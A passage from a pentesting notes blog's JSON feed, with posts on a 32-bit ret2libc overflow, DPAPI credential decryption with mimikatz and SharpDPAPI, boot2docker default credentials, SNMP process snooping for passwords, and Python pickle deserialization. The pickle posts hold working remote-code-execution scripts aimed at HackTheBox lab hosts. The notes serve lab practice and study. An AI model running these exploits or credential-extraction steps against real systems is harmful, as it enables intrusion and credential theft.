class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">shellcode</span><span class=\"p\">))</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">addr</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"k\">print</span> <span class=\"n\">payload</span></code></pre></div></div><p>This is similar to the first approach I tried not including the ENV stuff, but mine was not working for some reasons.</p><h2 id=\"references\">References</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[HTB: Enterprise</td>          <td>0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#shell-as-root)</td>        </tr>      </tbody>    </table>  </li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/03/bypass-pie-32bit-ret2libc",
            
            
            
            "tags": ["bof","linux","privesc"],
            
            "date_published": "2022-04-03T00:00:00+08:00",
            "date_modified": "2022-04-03T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/28/dpapi",
            "title": "DPAPI (Data Protection API)",
            "summary": "DPAPI (Data Protection API)",
            "content_text": "Overview  Perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy  Can be stored on xml files but may also be stored on .bin files  Typically starts at this set of standard bytes01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EBRelationship between different Windows security mechanismDecryption OverviewDecrypting DPAPI Blob using passcapeEnter the blob. I got the blob by converting the content of xml file into a bin file then transfer it to windows 10 vm.# From attackercat admin-pass.xml | xxd -r -p &gt; blob.binAt this point, the software automatically detects the master key GUI to use. I also transferred the CREDHIST file of victim to my windows 10 vm.Then I needed to get the user SID from mimikatz output. The password, well, I got it from registry.Unfortunately, I only have a trial version of the program so It only showed 1st 10 characters of the decrypted data.But this is a good thing, because atleast now I know there is a way to recover some data from dpapi blob. And also, I was able to validate what master key GUID and CREDHIST corresponds to the blob.Next quesion is, what alternative tool I can use?  blob - The Hacker Tools - this doesn’t work  Gotcha! from here.\\SharpDPAPI.exe blob /target:blob.bin '{98fafef2-d8a0-4b4f-917d-d8a1f5889c81}:DB6A7CB1AE10BFD70EA9BD8A4D10608A08D0969F'Mimikatz Commands# Shows structure of blobdpapi::blob /in:blob.binMaster Key CharacteristicsHere is an example from HTB helpline mimikatz output# This is also the filenames that you can see under# `AppData\\Roaming\\Microsoft\\Protect`* GUID      :  {98fafef2-d8a0-4b4f-917d-d8a1f5889c81}# The actual key in long format.* MasterKey :  daae4d9c34452f4bc6a17ccf4d87c369a15fcd5f81be5fc7211721a321f309392578ec1c225647cc2048d90854c7d94224cde619e23e04a0dbbaddb19efdf305# Key in SHA1 format.* sha1(key) :  db6a7cb1ae10bfd70ea9bd8a4d10608a08d0969fTools  GitHub - login-securite/DonPAPI: Dumping DPAPI credz remotely - looks like unstable, i always get EAccessViolation erorr  GitHub - GhostPack/SharpDPAPI: SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.  GitHub - jordanbtucker/dpapick: DPAPI offline decryption utility  GitHub - AlessandroZ/LaZagne: Credentials recovery projectReferences  Hacktricks - Extracting passwords from DPAPI  Decrypting Viscosity Passwords - MM  Data Protection API - Wikipedia  Recovering Windows Secrets and EFS Certificates Offline  DPAPI for pentesters by Konstantin Evdokimiv - looks great but haven’t read yet",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy</li>  <li>Can be stored on xml files but may also be stored on <code class=\"language-plaintext highlighter-rouge\">.bin</code> files</li>  <li>Typically starts at this set of standard bytes</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB</code></pre></div></div><h2 id=\"relationship-between-different-windows-security-mechanism\">Relationship between different Windows security mechanism</h2><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/3D767BD7-4352-49B1-B03F-5B7FB49A778F.png\" alt=\"\" /></p><h2 id=\"decryption-overview\">Decryption Overview</h2><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/F9D490E0-C3F6-424D-A690-02BF3C9B1631.png\" alt=\"\" /></p><h2 id=\"decrypting-dpapi-blob-using-passcape\">Decrypting DPAPI Blob using passcape</h2><p>Enter the blob. I got the blob by converting the content of xml file into a bin file then transfer it to windows 10 vm.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># From attacker</span><span class=\"nb\">cat </span>admin-pass.xml | xxd <span class=\"nt\">-r</span> <span class=\"nt\">-p</span> <span class=\"o\">&gt;</span> blob.bin</code></pre></div></div><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/F67DF87A-0162-4641-A25C-2EE039390CA1.png\" alt=\"\" /></p><p>At this point, the software automatically detects the master key GUI to use. I also transferred the <code class=\"language-plaintext highlighter-rouge\">CREDHIST</code> file of victim to my windows 10 vm.</p><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/F06BF5D9-D1AA-43E8-A559-B77E73FBEEA2.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/3D9DAF45-2234-465A-9454-06D94F3DA755.png\" alt=\"\" /></p><p>Then I needed to get the user SID from mimikatz output. The password, well, I got it from registry.</p><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/120FD0D1-606E-419F-93CC-DBB8BEFD6F32.png\" alt=\"\" /></p><p>Unfortunately, I only have a trial version of the program so It only showed 1st 10 characters of the decrypted data.</p><p><img src=\"/spindel/assets/DPAPI%20(Data%20Protection%20API)/26F28151-7805-40D0-9AC2-FB70942B1992.png\" alt=\"\" /></p><p>But this is a good thing, because atleast now I know there is a way to recover some data from dpapi blob. And also, I was able to validate what master key GUID and CREDHIST corresponds to the blob.</p><p>Next quesion is, what alternative tool I can use?</p><ul>  <li><a href=\"https://tools.thehacker.recipes/mimikatz/modules/dpapi/blob\">blob - The Hacker Tools</a> - this doesn’t work</li>  <li>Gotcha! from <a href=\"https://github.com/GhostPack/SharpDPAPI/blob/master/README.md#blob\">here</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>.<span class=\"se\">\\S</span>harpDPAPI.exe blob /target:blob.bin <span class=\"s1\">'{98fafef2-d8a0-4b4f-917d-d8a1f5889c81}:DB6A7CB1AE10BFD70EA9BD8A4D10608A08D0969F'</span></code></pre></div></div><h2 id=\"mimikatz-commands\">Mimikatz Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Shows structure of blob</span>dpapi::blob /in:blob.bin</code></pre></div></div><h2 id=\"master-key-characteristics\">Master Key Characteristics</h2><p>Here is an example from HTB helpline mimikatz output</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># This is also the filenames that you can see under</span><span class=\"c\"># `AppData\\Roaming\\Microsoft\\Protect`</span><span class=\"k\">*</span> GUID      :  <span class=\"o\">{</span>98fafef2-d8a0-4b4f-917d-d8a1f5889c81<span class=\"o\">}</span><span class=\"c\"># The actual key in long format.</span><span class=\"k\">*</span> MasterKey :  daae4d9c34452f4bc6a17ccf4d87c369a15fcd5f81be5fc7211721a321f309392578ec1c225647cc2048d90854c7d94224cde619e23e04a0dbbaddb19efdf305<span class=\"c\"># Key in SHA1 format.</span><span class=\"k\">*</span> sha1<span class=\"o\">(</span>key<span class=\"o\">)</span> :  db6a7cb1ae10bfd70ea9bd8a4d10608a08d0969f</code></pre></div></div><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/login-securite/DonPAPI\">GitHub - login-securite/DonPAPI: Dumping DPAPI credz remotely</a> - looks like unstable, i always get <code class=\"language-plaintext highlighter-rouge\">EAccessViolation</code> erorr</li>  <li><a href=\"https://github.com/GhostPack/SharpDPAPI\">GitHub - GhostPack/SharpDPAPI: SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.</a></li>  <li><a href=\"https://github.com/jordanbtucker/dpapick\">GitHub - jordanbtucker/dpapick: DPAPI offline decryption utility</a></li>  <li><a href=\"https://github.com/AlessandroZ/LaZagne\">GitHub - AlessandroZ/LaZagne: Credentials recovery project</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords\">Hacktricks - Extracting passwords from DPAPI</a></li>  <li><a href=\"https://blog.checkymander.com/red%20team/viscosity/decrypt-viscosity-passwords/\">Decrypting Viscosity Passwords - MM</a></li>  <li><a href=\"https://en.wikipedia.org/wiki/Data_Protection_API\">Data Protection API - Wikipedia</a></li>  <li><a href=\"https://www.usenix.org/legacy/event/woot10/tech/full_papers/Burzstein.pdf\">Recovering Windows Secrets and EFS Certificates Offline</a></li>  <li><a href=\"https://2018.offzone.moscow/getfile/?bmFtZT0xMi0wMF9XaW5kb3dzX0RQQVBJX1Nla3JldGlraS5wZGYmSUQ9NDEx\">DPAPI for pentesters by Konstantin Evdokimiv</a> - looks great but haven’t read yet</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/28/dpapi",
            
            
            
            "tags": ["windows","crypto"],
            
            "date_published": "2022-03-28T00:00:00+08:00",
            "date_modified": "2022-03-28T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/27/boot2docker",
            "title": "boot2docker",
            "summary": "boot2docker",
            "content_text": "OverviewOld way of running docker containers on system that doesn’t natively support docker such as Windows.Credentials# defaultdocker:tcuserCommands# confirm if you are running on boot2docker vm.# example output:#   Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linuxuname -a# can you ssh to host VM using default creds?ssh docker@172.17.0.1Interesting Files and Directories# c:\\ in windows/cReferences  Installation  GitHub - boot2docker/boot2docker: DEPRECATED; see https://github.com/boot2docker/boot2docker/pull/1408",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Old way of running docker containers on system that doesn’t natively support docker such as Windows.</p><p><img src=\"/spindel/assets/boot2docker/DC075513-10A7-4ADF-81BF-6CEF9297A2C1.png\" alt=\"\" /></p><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># default</span>docker:tcuser</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># confirm if you are running on boot2docker vm.</span><span class=\"c\"># example output:</span><span class=\"c\">#   Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux</span><span class=\"nb\">uname</span> <span class=\"nt\">-a</span><span class=\"c\"># can you ssh to host VM using default creds?</span>ssh docker@172.17.0.1</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># c:\\ in windows</span>/c</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.youtube.com/watch?v=Y80oQLfAwqk\">Installation</a></li>  <li><a href=\"https://github.com/boot2docker/boot2docker#ssh-into-vm\">GitHub - boot2docker/boot2docker: DEPRECATED; see https://github.com/boot2docker/boot2docker/pull/1408</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/27/boot2docker",
            
            
            
            "tags": ["docker","enum"],
            
            "date_published": "2022-03-27T00:00:00+08:00",
            "date_modified": "2022-03-27T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/25/monitoring-processes-using-snmp",
            "title": "Monitoring Processes via SNMP",
            "summary": "Monitoring Processes via SNMP",
            "content_text": "OverviewAttacker can monitor internal server processes by querying SNMP remotely from attacker machine. He may find juicy informations such as passwords passed on to scripts as arguments.StepsRun the following script. This will put ${TIMESTAMP}.txt files on your current directory which you can diff with each other.#!/bin/bashget_timestamp() {  date +'%m-%d-%Y-%H-%M-%S'}while true; do  echo \"[$(get_timestamp)] Checking processes ..\"  snmp-check 10.10.10.241 -v1 | egrep -v '(Uptime (snmp|system)|kworker)' &gt; $(get_timestamp).txt  sleep 10doneAlternatives  You can also narrow down by displaying only running processessnmpwalk -c public -v 1 sneaky 1.3.6.1.2.1.25.4.2.1.2",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can monitor internal server processes by querying SNMP remotely from attacker machine. He may find juicy informations such as passwords passed on to scripts as arguments.</p><h2 id=\"steps\">Steps</h2><p>Run the following script. This will put <code class=\"language-plaintext highlighter-rouge\">${TIMESTAMP}.txt</code> files on your current directory which you can diff with each other.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">#!/bin/bash</span>get_timestamp<span class=\"o\">()</span> <span class=\"o\">{</span>  <span class=\"nb\">date</span> +<span class=\"s1\">'%m-%d-%Y-%H-%M-%S'</span><span class=\"o\">}</span><span class=\"k\">while </span><span class=\"nb\">true</span><span class=\"p\">;</span> <span class=\"k\">do  </span><span class=\"nb\">echo</span> <span class=\"s2\">\"[</span><span class=\"si\">$(</span>get_timestamp<span class=\"si\">)</span><span class=\"s2\">] Checking processes ..\"</span>  snmp-check 10.10.10.241 <span class=\"nt\">-v1</span> | egrep <span class=\"nt\">-v</span> <span class=\"s1\">'(Uptime (snmp|system)|kworker)'</span> <span class=\"o\">&gt;</span> <span class=\"si\">$(</span>get_timestamp<span class=\"si\">)</span>.txt  <span class=\"nb\">sleep </span>10<span class=\"k\">done</span></code></pre></div></div><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can also narrow down by displaying only running processes</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>snmpwalk <span class=\"nt\">-c</span> public <span class=\"nt\">-v</span> 1 sneaky 1.3.6.1.2.1.25.4.2.1.2</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/03/25/monitoring-processes-using-snmp",
            
            
            
            "tags": ["foothold","enum","networking","snmp"],
            
            "date_published": "2022-03-25T00:00:00+08:00",
            "date_modified": "2022-03-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/22/python-pickle-deserialization",
            "title": "Python Pickle Deserialization",
            "summary": "Python Pickle Deserialization",
            "content_text": "Payload FormatHere is an example script I used in HTB Canape.#!/usr/bin/env python2import requestsimport pickleimport osfrom hashlib import md5class exploit(object):  def __reduce__(self):    return (os.system, ('echo homer &amp;&amp; ping -c 1 10.10.14.34',))    # THIS DOESNT WORK    # return (os.popen, ('echo homer &amp;&amp; ping -c 1 10.10.14.34',)) def dump_exploit():  return pickle.dumps(exploit())payload = dump_exploit()c = payload[:-1]q = payload[-1:]url = 'http://10.10.10.70'def submit():  r = requests.post(url + '/submit', data = {'character': c, 'quote': q})def check():  r = requests.post(url + '/check', data = {'id': md5(c+q).hexdigest()})submit()check()TroubleshootingWhen I did HTB Canape, my exploit didn’t work when I tried to use the HTML form in firefox.But when I tried 0xdf python script, it worked without any issues. I looked deeply by inspecting the packet capture for both python script and browser and here is what I found out.Left side (python script), right (firefox).Based from the capture, the python script is sending 0A which corresponds to newline \\n while the firefox capture is sending 5c which corresponds to file separator \\.If I tried again the HTML form in Firefox this time doing actual newline instead of \\n, the packet capture looks better but it added 0D for carriage return. Right now, I don’t have clue yet on how to remove it.  In HTB DevOops, my expoit was not working because I’m trying to incude Subject on the actual payload. Once I removed it, exploit worked.# This failspayload = dump_exploit()data_str = str({'Subject': payload})data = base64.urlsafe_b64encode(data_str)# This workedpayload = dump_exploit()data = base64.urlsafe_b64encode(payload)Other Examples  HTB DevOops# Vulnerable code@app.route(\"/newpost\", methods=[\"POST\"])def newpost():  # TODO: proper save to database, this is for testing purposes right now  picklestr = base64.urlsafe_b64decode(request.data)#  return picklestr  postObj = pickle.loads(picklestr)  return \"POST RECEIVED: \" + postObj['Subject']#!/usr/bin/env python2# Usage: python2 pickle_exploit.py 'ping -c 1 10.10.14.34'import requestsimport pickleimport osimport sysfrom hashlib import md5import base64cmd = sys.argv[1]class exploit(object):  def __reduce__(self):    return (os.system, (cmd,)) def dump_exploit():  return pickle.dumps(exploit())proxies = {'http': 'http://127.0.0.1:8080'}payload = dump_exploit()data = base64.urlsafe_b64encode(payload)url = 'http://10.10.10.91:5000'def submit():  print(payload)  r = requests.post(url + '/newpost', data = data, proxies = proxies)  if r.status_code == 500:    print('Exploit failed')  else:    print('Exploit successful!')submit()References  HTB Canape  Python Pickle Injection  Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles)  Pickle Arbitrary Code Execution",
            "content_html": "<h2 id=\"payload-format\">Payload Format</h2><p>Here is an example script I used in HTB Canape.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python2</span><span class=\"kn\">import</span> <span class=\"nn\">requests</span><span class=\"kn\">import</span> <span class=\"nn\">pickle</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">from</span> <span class=\"nn\">hashlib</span> <span class=\"kn\">import</span> <span class=\"n\">md5</span><span class=\"k\">class</span> <span class=\"nc\">exploit</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>  <span class=\"k\">def</span> <span class=\"nf\">__reduce__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>    <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">system</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"s\">'echo homer &amp;&amp; ping -c 1 10.10.14.34'</span><span class=\"p\">,))</span>    <span class=\"c1\"># THIS DOESNT WORK</span>    <span class=\"c1\"># return (os.popen, ('echo homer &amp;&amp; ping -c 1 10.10.14.34',)) </span><span class=\"k\">def</span> <span class=\"nf\">dump_exploit</span><span class=\"p\">():</span>  <span class=\"k\">return</span> <span class=\"n\">pickle</span><span class=\"p\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span><span class=\"n\">exploit</span><span class=\"p\">())</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">dump_exploit</span><span class=\"p\">()</span><span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">payload</span><span class=\"p\">[:</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"n\">q</span> <span class=\"o\">=</span> <span class=\"n\">payload</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">:]</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">'http://10.10.10.70'</span><span class=\"k\">def</span> <span class=\"nf\">submit</span><span class=\"p\">():</span>  <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">post</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"s\">'/submit'</span><span class=\"p\">,</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'character'</span><span class=\"p\">:</span> <span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"s\">'quote'</span><span class=\"p\">:</span> <span class=\"n\">q</span><span class=\"p\">})</span><span class=\"k\">def</span> <span class=\"nf\">check</span><span class=\"p\">():</span>  <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">post</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"s\">'/check'</span><span class=\"p\">,</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'id'</span><span class=\"p\">:</span> <span class=\"n\">md5</span><span class=\"p\">(</span><span class=\"n\">c</span><span class=\"o\">+</span><span class=\"n\">q</span><span class=\"p\">).</span><span class=\"n\">hexdigest</span><span class=\"p\">()})</span><span class=\"n\">submit</span><span class=\"p\">()</span><span class=\"n\">check</span><span class=\"p\">()</span></code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><p>When I did HTB Canape, my exploit didn’t work when I tried to use the HTML form in firefox.</p><p><img src=\"/spindel/assets/Python%20Pickle%20Deserialization/FF16D104-763D-42D2-BF3D-C8181797ADAA.png\" alt=\"\" /></p><p>But when I tried 0xdf python <a href=\"https://0xdf.gitlab.io/2018/09/15/htb-canape.html#code\">script</a>, it worked without any issues. I looked deeply by inspecting the packet capture for both python script and browser and here is what I found out.</p><p>Left side (python script), right (firefox).</p><p><img src=\"/spindel/assets/Python%20Pickle%20Deserialization/7A8A1D33-2216-448E-865C-B2D8D716722D.png\" alt=\"\" /></p><p>Based from the capture, the python script is sending <code class=\"language-plaintext highlighter-rouge\">0A</code> which corresponds to newline <code class=\"language-plaintext highlighter-rouge\">\\n</code> while the firefox capture is sending <code class=\"language-plaintext highlighter-rouge\">5c</code> which corresponds to file separator <code class=\"language-plaintext highlighter-rouge\">\\</code>.</p><p>If I tried again the HTML form in Firefox this time doing actual newline instead of <code class=\"language-plaintext highlighter-rouge\">\\n</code>, the packet capture looks better but it added <code class=\"language-plaintext highlighter-rouge\">0D</code> for carriage return. Right now, I don’t have clue yet on how to remove it.</p><p><img src=\"/spindel/assets/Python%20Pickle%20Deserialization/FFB1CBD7-E58C-4BFE-B7B7-25C0016D1223.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Python%20Pickle%20Deserialization/F3B4C80C-4063-4C05-8C08-FAD46B34E93A.png\" alt=\"\" /></p><ul>  <li>In HTB DevOops, my expoit was not working because I’m trying to incude <code class=\"language-plaintext highlighter-rouge\">Subject</code> on the actual payload. Once I removed it, exploit worked.</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\"># This fails</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">dump_exploit</span><span class=\"p\">()</span><span class=\"n\">data_str</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">({</span><span class=\"s\">'Subject'</span><span class=\"p\">:</span> <span class=\"n\">payload</span><span class=\"p\">})</span><span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">urlsafe_b64encode</span><span class=\"p\">(</span><span class=\"n\">data_str</span><span class=\"p\">)</span><span class=\"c1\"># This worked</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">dump_exploit</span><span class=\"p\">()</span><span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">urlsafe_b64encode</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span></code></pre></div></div><h2 id=\"other-examples\">Other Examples</h2><ul>  <li>HTB DevOops</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\"># Vulnerable code</span><span class=\"o\">@</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">route</span><span class=\"p\">(</span><span class=\"s\">\"/newpost\"</span><span class=\"p\">,</span> <span class=\"n\">methods</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"s\">\"POST\"</span><span class=\"p\">])</span><span class=\"k\">def</span> <span class=\"nf\">newpost</span><span class=\"p\">():</span>  <span class=\"c1\"># TODO: proper save to database, this is for testing purposes right now</span>  <span class=\"n\">picklestr</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">urlsafe_b64decode</span><span class=\"p\">(</span><span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">)</span><span class=\"c1\">#  return picklestr</span>  <span class=\"n\">postObj</span> <span class=\"o\">=</span> <span class=\"n\">pickle</span><span class=\"p\">.</span><span class=\"n\">loads</span><span class=\"p\">(</span><span class=\"n\">picklestr</span><span class=\"p\">)</span>  <span class=\"k\">return</span> <span class=\"s\">\"POST RECEIVED: \"</span> <span class=\"o\">+</span> <span class=\"n\">postObj</span><span class=\"p\">[</span><span class=\"s\">'Subject'</span><span class=\"p\">]</span></code></pre></div></div><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python2</span><span class=\"c1\"># Usage: python2 pickle_exploit.py 'ping -c 1 10.10.14.34'</span><span class=\"kn\">import</span> <span class=\"nn\">requests</span><span class=\"kn\">import</span> <span class=\"nn\">pickle</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"kn\">from</span> <span class=\"nn\">hashlib</span> <span class=\"kn\">import</span> <span class=\"n\">md5</span><span class=\"kn\">import</span> <span class=\"nn\">base64</span><span class=\"n\">cmd</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"k\">class</span> <span class=\"nc\">exploit</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>  <span class=\"k\">def</span> <span class=\"nf\">__reduce__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>    <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">system</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"n\">cmd</span><span class=\"p\">,))</span> <span class=\"k\">def</span> <span class=\"nf\">dump_exploit</span><span class=\"p\">():</span>  <span class=\"k\">return</span> <span class=\"n\">pickle</span><span class=\"p\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span><span class=\"n\">exploit</span><span class=\"p\">())</span><span class=\"n\">proxies</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'http'</span><span class=\"p\">:</span> <span class=\"s\">'http://127.0.0.1:8080'</span><span class=\"p\">}</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">dump_exploit</span><span class=\"p\">()</span><span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">urlsafe_b64encode</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">'http://10.10.10.91:5000'</span><span class=\"k\">def</span> <span class=\"nf\">submit</span><span class=\"p\">():</span>  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span>  <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">post</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"s\">'/newpost'</span><span class=\"p\">,</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"n\">proxies</span> <span class=\"o\">=</span> <span class=\"n\">proxies</span><span class=\"p\">)</span>  <span class=\"k\">if</span> <span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">status_code</span> <span class=\"o\">==</span> <span class=\"mi\">500</span><span class=\"p\">:</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Exploit failed'</span><span class=\"p\">)</span>  <span class=\"k\">else</span><span class=\"p\">:</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Exploit successful!'</span><span class=\"p\">)</span><span class=\"n\">submit</span><span class=\"p\">()</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Canape</li>  <li><a href=\"http://xhyumiracle.com/python-pickle-injection/\">Python Pickle Injection</a></li>  <li><a href=\"https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/\">Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles)</a></li>  <li><a href=\"https://root4loot.com/post/exploiting_cpickle/\">Pickle Arbitrary Code Execution</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/22/python-pickle-deserialization",
            
            
            
            "tags": ["python","deserialization","foothold"],
            
            "date_published": "2022-03-22T00:00:00+08:00",
            "date_modified": "2022-03-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/17/docker",
            "title": "Docker",
            "summary": "Docker",
